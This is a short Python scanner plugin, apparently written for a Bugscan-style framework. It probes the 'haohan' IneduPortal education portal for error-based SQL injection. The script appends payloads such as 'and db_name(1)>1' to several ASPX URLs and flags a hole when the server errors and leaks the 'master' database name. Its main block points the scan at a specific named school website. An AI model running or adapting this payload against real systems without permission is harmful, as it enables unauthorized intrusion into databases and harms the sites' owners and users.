#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:小光
#refer:http://www.wooyun.org/bugs/wooyun-2010-0105458
#refer:http://www.wooyun.org/bugs/wooyun-2010-0105373
#refer:http://www.wooyun.org/bugs/wooyun-2010-0105449
#refer:http://www.wooyun.org/bugs/wooyun-2010-0105701

import re

def assign(service, arg):
    if service == "haohan":
        return True, arg
        
        
        
def audit(arg): 
    payload1 = ['IneduPortal/Components/Teacher/ShowTeacher.aspx?famid=1&id=1',
    'IneduPortal/Components/mailbox/MailBoxList.aspx?ModuleID=796',
    'IneduPortal/Components/MailBox/MailBoxList.aspx?id=1'
    ]
    for payload in payload1:
        get = '%20and%20db_name(1)%3E1'
        url = arg + payload +get
        code, head, res, errcode, _ = curl.curl2(url)
        m = re.search('master',res)
        if code == 500 and m:
            security_hole(arg+payload+"   :found sql Injection")
    payload2 = ['IneduPortal/Components/WeekCalendar/PrintWeekCalendar.aspx?termid=2014-2015-1'
    ]
    for payload in payload2:
        get = '%27%20and%20db_name(1)%3E1--'
        url = arg + payload +get
        code, head, res, errcode, _ = curl.curl2(url)
        m = re.search('master',res)
        if code == 500 and m:
            security_hole(arg+payload+"   :found sql Injection")


if __name__ == '__main__':
    from dummy import *
    audit(assign('haohan', 'http://www.gx2x.cn/')[1])